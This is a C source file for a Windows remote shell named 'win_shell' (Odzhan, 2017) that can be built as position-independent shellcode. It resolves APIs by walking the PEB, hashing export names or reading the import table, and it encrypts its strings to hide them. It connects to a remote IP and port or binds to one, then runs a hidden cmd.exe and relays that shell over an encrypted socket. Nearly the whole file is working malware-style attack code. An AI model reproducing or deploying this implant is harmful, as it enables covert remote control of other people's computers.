/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "include.h"

enum strhash_opts {
  STR_HASH_LOWER=1,
  STR_HASH_UPPER
};

#define GLOBAL_CFG
#include "cfg.h"
#undef GLOBAL_CFG

typedef union _str_hash_t {
    uint8_t  b[MAX_CRYPT_STRING_LEN];
    uint32_t w[MAX_CRYPT_STRING_LEN/sizeof(uint32_t)];
} str_hash;

FARPROC MyGetProcAddress(DWORD);

#ifdef API_MODE_EAT
LPVOID get_api (sc_cls *c, const uint64_t api_hash);
#else
LPVOID get_api (sc_cls *c, const uint8_t *api_hash);
#endif

void c_cmd (sc_cls*);
char *strcrypt (sc_cls*, const void*);
uint64_t strhash (const void*, void*, int);

#ifndef PIC

DWORD MyGetLastError(VOID)
{
#ifdef _WIN64  
  return (DWORD)__readgsqword(0x68);
#else
  return (DWORD)__readfsdword(0x34);
#endif  
}

#endif

/**F*********************************************
 *
 * entry point of PIC
 *
 ************************************************/
#ifdef PIC
void mainCRTStartup(void)
#else
int main(int argc, char *argv[])
#endif
{
    WSADATA            wsa;
    sc_cls             c;
    DWORD              i, idx;
    int                r, t;
    
    #if AF_FAMILY==AF_INET
    struct sockaddr_in  sa;
    #else
    struct sockaddr_in6 sa;  
    #endif  
    
    #define MAIN_CFG
    #include "cfg.h"
    #undef MAIN_CFG
    
    #ifndef PIC
      if (argc != 3) {
        printf ("\nusage: win_shell <local or remote ip> <local or remote port>\n");
        return 0;
      }
    #endif
    
    memset(&c, 0, sizeof(c));
    
    // set key for strcrypt + strhash 
    memcpy(c.p.strkey, strcrypt_key, MAX_CRYPT_KEY_LEN);
    
    // set encryption key
    memcpy(c.p.ctx.e_key, enc_key, BC_KEY_LENGTH);
    
    // set mac key
    memcpy(c.p.ctx.m_key, mac_key, BC_KEY_LENGTH*2);
    
    #ifndef PIC
      LoadLibrary("advapi32");
    #endif
    
    idx = 0;
    
    // resolve kernel32 api first
    #ifdef API_MODE_IAT      
      for (i=0; i<sizeof(k32_tbl)/MAX_CRYPT_STRING_LEN; i++) {
        c.m.api[idx++] = get_api(&c, (void*)&k32_tbl[i]);    
    #else
      for (i=0; i<sizeof(k32_tbl)/sizeof(uint64_t); i++) {
        c.m.api[idx++] = get_api(&c, k32_tbl[i]);
    #endif   
        if (c.m.api[idx-1] == NULL) {
          DEBUG_PRINT("Error resolving kernel32 API #%i", i);    
          return;
        }
      }  

    DEBUG_PRINT("Resolved kernel32 api");
    
    // load ws2_32.dll
    c.m.pLoadLibrary(strcrypt(&c, ws2_32));
    
    // resolve ws2_32 api
    #ifdef API_MODE_IAT      
      for (i=0; i<sizeof(ws32_tbl)/MAX_CRYPT_STRING_LEN; i++) {
        c.m.api[idx++] = get_api(&c, (void*)&ws32_tbl[i]);    
    #else
      for (i=0; i<sizeof(ws32_tbl)/sizeof(uint64_t); i++) {
        c.m.api[idx++] = get_api(&c, ws32_tbl[i]);
    #endif  
        if (c.m.api[idx-1] == NULL) {
          DEBUG_PRINT("Error resolving ws2_32 API #%i", i);
          return;
        }    
    }

    DEBUG_PRINT("Resolved ws2_32 api");
    
    // initialize winsock
    c.m.pWSAStartup (MAKEWORD(2, 0), &wsa);
    
    // create tcp socket
    c.p.s = c.m.psocket (AF_FAMILY, 
        SOCK_STREAM, IPPROTO_TCP);
        
    // using IPv4?
    #if AF_FAMILY == AF_INET
      sa.sin_family              = AF_INET;
      #if defined(PIC)
        sa.sin_port              = DEFAULT_PORT;
        memcpy(&sa.sin_addr, DEFAULT_IP, sizeof(DEFAULT_IP));
      #else
        sa.sin_port              = HTONS(atoi(argv[2]));
        inet_pton(AF_INET, argv[1], &(sa.sin_addr));    
      #endif
    #else
      // using IPv6 instead
      memset(&sa, 0, sizeof(sa));
      sa.sin6_family             = AF_INET6;    
      #if defined(PIC)
        sa.sin6_port             = DEFAULT_PORT;
        memcpy(&sa.sin6_addr, DEFAULT_IP, sizeof(DEFAULT_IP));
      #else
        sa.sin6_port             = HTONS(atoi(argv[2]));
        inet_pton(AF_INET6, argv[1], &(sa.sin6_addr));    
      #endif      
    #endif      

    #ifdef NET_MODE_BIND
      r = ~0UL;
      // bind to port
      if (!c.m.pbind (c.p.s, 
          (const struct sockaddr*)&sa, sizeof (sa)))
      {
        // set to listen
        if (!c.m.plisten(c.p.s, 0))
        {
          // accept connections from clients
          r = c.m.paccept(c.p.s, 0, 0);
      
          // swap bind socket handle
          t = c.p.s;
          c.p.s = r;
          
          r = (r <= 0) ? ~0UL : 0;
        }
      } else {
        DEBUG_PRINT("bind failed");
      }
    #else
      // connect to server
      r = c.m.pconnect (c.p.s, 
          (const struct sockaddr*)&sa, sizeof (sa));
    #endif
    
    if (!r)
    {
      c.p.evt0 = c.m.pWSACreateEvent();
    
      // execute cmd.exe
      c_cmd(&c);

      // close socket event handle
      c.m.pCloseHandle(c.p.evt0);
    } else {
      DEBUG_PRINT("connection failed %i", MyGetLastError());
    }
    #ifdef NET_MODE_BIND
      // close connection to client
      c.m.pshutdown(c.p.s, SD_BOTH);
      c.m.pclosesocket(c.p.s);
      c.p.s = t;
    #endif    
    c.m.pshutdown(c.p.s, SD_BOTH);  
    // close socket
    c.m.pclosesocket (c.p.s);
}

/**F*********************************************
 *
 * send packet, fragmented if required
 *
 ************************************************/
int send_pkt (sc_cls *c, void *buf, int buflen)
{
    int      len, sum, outlen=buflen;
    uint8_t  *p=(uint8_t*)buf;
    
    DEBUG_PRINT("Sending %i bytes", buflen);

    // 1. wrap it up
    outlen=encrypt(&c->p.ctx, buf, buflen, SPP_ENCRYPT); 

    DEBUG_PRINT("Encrypted length is %i bytes", outlen);
    
    // 2. send it
    for (sum=0; sum<outlen; sum += len) {
      len=c->m.psend (c->p.s, (char*)&p[sum], outlen - sum, 0);
      if (len <= 0) return -1;
    }
    return sum;
}

/**F*********************************************
 *
 * send data
 *
 ************************************************/
int xspp_send (sc_cls *c)
{
    int len, outlen=c->p.buf.len.w;
    
    // 1. send length
    c->p.buf.len.w += SPP_MAC_LEN;
    len = send_pkt(c, &c->p.buf.len.b, sizeof(int));
    
    if (len>0) {
      // 2. send data
      len = send_pkt (c, &c->p.buf.data.b, outlen);
    }
    // 3. return OK if no error
    return (len <= 0) ? SPP_ERR_SCK : SPP_ERR_OK;
}

/**F*********************************************
 *
 * receive packet, fragmented if required
 *
 ************************************************/
int recv_pkt (sc_cls *c, void *buf, int buflen) 
{
    int      len, sum;
    uint8_t  *p=(uint8_t*)buf;
    
    DEBUG_PRINT("Receiving %i bytes", buflen);
    
    // 1. receive data
    for (sum=0; sum<buflen; sum += len) {
      len=c->m.precv (c->p.s, (char*)&p[sum], buflen - sum, 0);
      if (len <= 0) return -1;
    }
    // 2. unwrap it
    return encrypt(&c->p.ctx, buf, buflen, CRYPT_DECRYPT);
}

/**F*********************************************
 *
 * receive data, decrypt if required
 *
 ************************************************/
int xspp_recv (sc_cls *c)
{
    int len;
    
    // 1. receive the length
    len=recv_pkt (c, c->p.buf.len.b, sizeof(spp_len));
    
    if (len>0)
    {    
      // 2. receive the data
      len=recv_pkt (c, &c->p.buf.data.b, 
          c->p.buf.len.buflen);  
      if (len>0) {
        c->p.buf.data.b[len] = 0;
        c->p.buf.len.buflen  = (uint16_t)len;
      }
    }
    // 3. return OK if no errors
    return (len <= 0) ? SPP_ERR_SCK : SPP_ERR_OK;
}

/**F*********************************************
 *
 * Wait for events from multiple sources
 *
 ************************************************/
DWORD wait_evt (sc_cls *c)
{
    WSANETWORKEVENTS ne;
    u_long           opt;
    DWORD            e;
    
    // set to non-blocking mode.
    // monitor TCP read/close events
    c->m.pWSAEventSelect (c->p.s, c->p.evt0, 
        FD_CLOSE | FD_READ);
      
    // wait for multiple events to trigger
    e=c->m.pWaitForMultipleObjects (c->p.evt_cnt, 
        &c->p.evt0, FALSE, INFINITE);
    
    // enumerate events for socket
    c->m.pWSAEnumNetworkEvents (c->p.s, c->p.evt0, &ne);
    
    // clear monitor
    c->m.pWSAEventSelect (c->p.s, c->p.evt0, 0);
    
    // set socket to blocking mode
    opt=0;
    c->m.pioctlsocket (c->p.s, FIONBIO, &opt);
    
    // closed?
    if (ne.lNetworkEvents & FD_CLOSE) {
      e = ~0UL;
    }
    return e;
}

/**F*********************************************
 *
 * Main loop for cmd.exe
 *
 * Writes input from server to stdin
 * Reads output from stdout and sends to server
 *
 ************************************************/
void cmd_loop(sc_cls *c)
{
    DWORD      e, p=0;
    OVERLAPPED lap;

    memset((uint8_t*)&lap, 0, sizeof(lap));

    c->p.evt_cnt=3;
    
    // assign event handle for stdout  
    lap.hEvent=c->p.evt1;
    
    for (;;)
    {
      e = wait_evt(c);
      
      // socket event?
      if (e == 0) 
      {
        DEBUG_PRINT("socket event");
        // receive data
        xspp_recv(c);
        if (c->p.buf.len.w <= 0) {
          DEBUG_PRINT("xspp_recv() failed");
          break;
        }
        
        DEBUG_PRINT("Writing %i bytes %s to stdin", 
            c->p.buf.len.w, c->p.buf.data.b);
        
        // write to stdin
        c->m.pWriteFile (c->p.in0, c->p.buf.data.b, 
            c->p.buf.len.w, (PDWORD)&c->p.buf.len.w, 0);         
      } else
     
      // stdout/stderr of cmd.exe?
      if (e == 1) 
      {
        DEBUG_PRINT("Reading from stdout");
        // no read pending
        if (p == 0)
        {
          c->m.pReadFile (c->p.out1, c->p.buf.data.b, 
              SPP_BLK_LEN, (PDWORD)&c->p.buf.len.w, &lap);
          p++;
        } else {
          if (!c->m.pGetOverlappedResult (c->p.out1, 
              &lap, (PDWORD)&c->p.buf.len.w, FALSE)) 
          {
            break;
          }
        }
        if (c->p.buf.len.w != 0)
        {
          xspp_send(c);
          if (c->p.buf.len.w <= 0) {
            DEBUG_PRINT("xspp_send() failed");
            break;
          }
          p--;
        }
      } else {
        // either the socket closed or cmd.exe ended
        DEBUG_PRINT("socket closed or cmd.exe terminated");
        break;
      }
    }
    c->p.evt_cnt=1;
}

/**F*********************************************
 *
 * Spawn cmd.exe for server
 *
 ************************************************/
void c_cmd (sc_cls *c)
{
    SECURITY_ATTRIBUTES sa;
    STARTUPINFO         si;
    char                *pname;
    
    #define CMD_CFG
    #include "cfg.h"
    #undef CMD_CFG
    
    pname = strcrypt(c, pipe_str);
    
    // initialize security descriptor
    sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;
    
    // create named pipe for stdout + stderr of cmd.exe
    c->p.out1 = c->m.pCreateNamedPipe (pname, 
        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE, 1, 0, 0, 0, &sa);
          
    if (c->p.out1 != INVALID_HANDLE_VALUE)
    {
      // create anonymous pipe for reading stdin of cmd.exe
      if (c->m.pCreatePipe (&c->p.in1, &c->p.in0, &sa, 0))
      {
        DEBUG_PRINT("Opening named pipe %s", pname);
        // open named pipe for write access
        c->p.out0 = c->m.pCreateFile (pname, GENERIC_WRITE, 
            0, &sa, OPEN_EXISTING, 0, NULL);
            
        if (c->p.out0 != INVALID_HANDLE_VALUE)
        {
          // create event for stdout events
          c->p.evt1 = c->m.pCreateEvent (NULL, 
              TRUE, TRUE, NULL);
    
          // zero initialize STARTUPINFO
          memset((uint8_t*)&si, 0, sizeof(si));
          
          si.cb         = sizeof (si);
          // assign read handle of anonymous pipe
          si.hStdInput  = c->p.in1;     
          // assign write handle of named pipe to stdout/stderr
          si.hStdError  = c->p.out0;    
          si.hStdOutput = c->p.out0;
          si.dwFlags    = STARTF_USESTDHANDLES;
          
          // execute cmd.exe without visible window
          DEBUG_PRINT("Creating cmd.exe");
          
          if (c->m.pCreateProcess (NULL, strcrypt(c, cmd_str), 
              NULL, NULL, TRUE, CREATE_NO_WINDOW, 
              NULL, NULL, &si, &c->p.pi))
          {
            // enter main loop
            cmd_loop(c);
            // just incase socket closed, terminate cmd.exe
            c->m.pTerminateProcess (c->p.pi.hProcess, 0);
            // close handles
            c->m.pCloseHandle(c->p.pi.hThread);
            c->m.pCloseHandle(c->p.pi.hProcess);
          } else {
            DEBUG_PRINT("CreateProcess() %i", MyGetLastError());
          }
          // close event for stdout of cmd.exe
          c->m.pCloseHandle(c->p.evt1);
          // close named pipe handle
          c->m.pCloseHandle(c->p.out0);
        }
        // close anon pipes
        c->m.pCloseHandle(c->p.in0);
        c->m.pCloseHandle(c->p.in1);
      }
      // close named pipe
      c->m.pCloseHandle(c->p.out1);
    }
}

#ifdef API_MODE_EAT

// generate 64-bit hash of short string using 128-bit key
uint64_t strhash(const void *key, void *str, int flags) {
    union {
      uint8_t  b[BLOCK_LENGTH];
      uint64_t q;
    } m, h;
    uint8_t *p=(uint8_t*)str;
    int     i, idx=0;
    char    c;
    
    h.q = 0;
    
    while (*p) {
      c = *p++;
      if (flags == STR_HASH_LOWER) {
        c = tolower(c);
      } else if (flags == STR_HASH_UPPER) {
        c = toupper(c);
      }
      // add byte to buffer
      // increase index and string pointer
      m.b[idx++] = c;
      // buffer filled?
      if (idx == BLOCK_LENGTH) {
        // encrypt buffer
        speck64_encrypt(key, &m);
        // reset index
        idx  = 0;
        // add ciphertext to hash value
        h.q += m.q;
      }    
    }
    // add the end bit
    m.b[idx++] = 0x80;
    // absorb final string bits into hash
    for (i=0; i<idx; i++) {
      h.b[i] += m.b[i];
    }
    // encrypt one last time
    speck64_encrypt(key, &h);
    // return 64-bit hash
    return h.q;
}

LPVOID eat_getapi(sc_cls *c, LPVOID base, uint64_t hash)
{
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   cnt, rva;
    ULONGLONG               dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  api_adr=NULL;
    
    DEBUG_PRINT ("\nhash to find %llx", hash);
    
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    DEBUG_PRINT ("\nDLL is %s", dll);
    
    // calculate hash of DLL string
    dll_h = strhash(c->p.strkey, dll, STR_HASH_LOWER);
    
    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // add to DLL hash and compare
      if ((strhash(c->p.strkey, api, 0) + dll_h) == hash) {
        // return address of function
        api_adr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        return api_adr;
      }
    } while (--cnt && api_adr==0);
    return api_adr;
}

#else
  
LPVOID get_proc_address(sc_cls *c)
{
    DWORD                    rva;
    PIMAGE_IMPORT_DESCRIPTOR imp;
    PIMAGE_DOS_HEADER        dos;
    PDWORD                   name;
    PIMAGE_THUNK_DATA        oft, ft;
    PIMAGE_IMPORT_BY_NAME    ibn;  
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_DATA_DIRECTORY    dir;
    LPVOID                   base, gpa=NULL;
    PWCHAR                   dll;
    PPEB                     peb;
    PPEB_LDR_DATA            ldr;
    PLDR_DATA_TABLE_ENTRY    dte;
    CHAR                     dll_name[MAX_CRYPT_STRING_LEN];
    WORD                     i;
    
    #define GET_PROC_CFG
    #include "cfg.h"
    #undef GET_PROC_CFG
    
    #if defined(_WIN64)
      peb = (PPEB) __readgsqword(0x60);
    #else
      peb = (PPEB) __readfsdword(0x30);
    #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && gpa == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // copy name to local buffer
      dll = dte->BaseDllName.Buffer;

      for (i=0; i<dte->BaseDllName.Length/2; i++) {
        dll_name[i] = (CHAR)dll[i];     
      }
      dll_name[i] = 0;
      
      DEBUG_PRINT("Comparing %s with %s", 
          dll_name, strcrypt(c, peb_dll));
   
      // is this our target EXE/DLL?
      if (!strcmpi(dll_name, strcrypt(c, peb_dll))) 
      {      
        DEBUG_PRINT("Found PEB DLL: %s", 
            strcrypt(c, peb_dll));
        
        base = dte->DllBase;
        dos  = (PIMAGE_DOS_HEADER)base;
        nt   = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
        dir  = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
        rva  = dir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;  
        imp  = (PIMAGE_IMPORT_DESCRIPTOR) RVA2VA(ULONG_PTR, base, rva);
    
        // locate kernel32.dll
        for (;imp->Name!=0 && gpa==NULL; imp++) 
        {
          name = RVA2VA(PDWORD, base, imp->Name);
          
          DEBUG_PRINT("Comparing %s with %s", 
              name, strcrypt(c, iat_dll));
          
          if (!strcmpi((const char*)name, strcrypt(c, iat_dll)))
          {
            DEBUG_PRINT("Found kernel32 DLL: %s", 
                strcrypt(c, iat_dll));
        
            // locate GetProcAddress
            rva = imp->OriginalFirstThunk;
            oft = (PIMAGE_THUNK_DATA)RVA2VA(ULONG_PTR, base, rva);
            
            rva = imp->FirstThunk;
            ft  = (PIMAGE_THUNK_DATA)RVA2VA(ULONG_PTR, base, rva); 
            
            for (;; oft++, ft++) 
            {
              if (oft->u1.Ordinal == 0) break;
              // skip import by ordinal
              if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) continue;
              
              rva  = oft->u1.AddressOfData;
              ibn  = (PIMAGE_IMPORT_BY_NAME)RVA2VA(ULONG_PTR, base, rva);
              name = (PDWORD)ibn->Name;
              
              // is this GetProcAddress?
              if (!strcmpi((const char*)name, strcrypt(c, gpa_str))) {
                DEBUG_PRINT("Found GetProcAddress");
                gpa = (LPVOID)ft->u1.Function;
                break;
              }
            }
          }
        }
      }
    }    
    return gpa;
}
#endif

/**F*********************************************
 *
 * Obtain address of API 
 *
 ************************************************/
#ifdef API_MODE_EAT
LPVOID get_api (sc_cls *c, const uint64_t api_hash)
#else
LPVOID get_api (sc_cls *c, const uint8_t *api_hash)
#endif
{
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                api=NULL;
    
    #ifndef API_MODE_EAT
      GetProcAddress_t    pGetProcAddress;
      
      // obtain GetProcAddress from IAT
      pGetProcAddress=(GetProcAddress_t)get_proc_address(c);
      
      if (pGetProcAddress == NULL) {
        return NULL;
      }
    #endif
    
    #if defined(_WIN64)
      peb = (PPEB) __readgsqword(0x60);
    #else
      peb = (PPEB) __readfsdword(0x30);
    #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && api == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {  
      #ifdef API_MODE_EAT
        api = eat_getapi(c, dte->DllBase, api_hash); 
      #else
        // try obtain api address through GetProcAddress
        api = pGetProcAddress(dte->DllBase, (LPCSTR)strcrypt(c, api_hash));
      #endif
    }
    return api;
}

// generate 256-bit plaintext from 256-bit ciphertext
char *strcrypt(sc_cls *c, const void *crypt) {
    uint64_t *o=(uint64_t*)c->p.buf.data.b;
    int      i;
    
    memcpy(c->p.buf.data.b, crypt, MAX_CRYPT_STRING_LEN);
    
    for (i=0; i<MAX_CRYPT_STRING_LEN/sizeof(uint64_t); i++) {
      speck64_encrypt(c->p.strkey, &o[i]);
    }
    return (char*)c->p.buf.data.b;
}
  